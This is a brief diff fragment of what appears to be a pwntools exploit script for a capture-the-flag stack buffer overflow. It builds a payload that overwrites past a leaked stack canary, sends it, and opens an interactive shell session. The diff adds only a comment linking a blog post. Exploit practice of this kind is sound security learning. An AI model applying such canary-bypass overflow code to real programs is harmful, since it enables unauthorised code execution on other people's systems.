@@ -14,3 +14,4 @@ payload = b"A"*0x38 + p64(cnry) + b"A"*8
 p.sendlineafter("Buf: ", buf)
 
 p.interactive()
+//https://kblab.tistory.com/223
